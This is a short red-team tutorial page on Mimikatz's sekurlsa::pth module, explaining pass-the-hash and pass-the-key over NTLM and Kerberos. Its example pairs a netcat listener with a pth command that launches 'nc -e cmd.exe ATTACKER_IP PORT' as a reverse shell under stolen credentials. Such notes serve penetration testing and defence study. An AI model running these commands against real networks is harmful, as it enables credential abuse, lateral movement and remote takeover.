# sekurlsa::pth

{% embed url="https://www.praetorian.com/blog/inside-mimikatz-part1/" %}

{% embed url="https://www.praetorian.com/blog/inside-mimikatz-part2/" %}

### Overview of how _Mimikatz_ implements the pass-the-hash technique

The `sekurlsa::pth` module allows an attacker to impersonate a user by spawning a new logon session on the local machine, and associating the attacker’s supplied credentials with that session. It will then launch a process specified by the attacker (reverse shell, etc.) under the context of the new forged session.

This entire process happens locally, and no external authentication is performed at this stage. However, subsequent network requests made from the new session will use the injected credentials, allowing us to perform lateral movement and other actions without knowing the actual password.

#### Technical details

The `sekurlsa::pth` method performs a **Pass-the-Hash** or **Pass-the-Key** attack for NTLM and Kerberos authentication respectively, that depends on the provided options (eg. `/ntlm` , `/rc4` , etc.).

Any external network connections (eg. `schtasks` , `sc.exe` , etc.) executed from that forged logon session will automatically use the injected credentials, giving us access as that particular user on the remote machine.

**a. Using stolen NTLM hash with NetNTLM authentication**

1. When we receive a challenge from the remote server, the injected NTLM hash will be used to create the challenge response&#x20;
2. Since we are using the NTLM hash of the target user, we can authenticate as that particular user

**b. Using stolen encryption key with Kerberos authentication**

1. Given that we have extracted the Kerberos encryption key, it can be used to encrypt the timestamp that is required for the **TGT** request
2. The **KDC** will then respond with the **TGT** and a **Session Key**
3. Subsequently, we can use the retrieved values to request for a **TGS** as the user stored in the Kerberos encryption key in the first step

#### Basic command

{% code overflow="wrap" %}
```
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /<xxxx>:<hash> /run:"<payload>"
```
{% endcode %}

* `<xxxx>:hash` can be `/ntlm:<hash>` , `/aes128:<hash>` , etc.
* `/run` allows us to provide a payload to be executed locally with the injected credentials
  * this will usually be a reverse shell connection

#### Example

Suppose we have found a user's NTLM hash using the `lsadump::sam` or `sekurlsa::msv` methods. We can use the found hash to retrieve a logon session as the user.

First, we need to establish a listener to catch the shell:

```sh
$ nc -lvnp PORT
```

Next, perform PtH:

{% code overflow="wrap" %}
```
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /<xxxx>:<hash> /run:"nc -e cmd.exe ATTACKER_IP PORT" 
```
{% endcode %}

From the shell session established:

Note that if we execute the `whoami` command, we will still see the original user we were using before performing the attack, but any commands executed from this session will use the injected credentials.

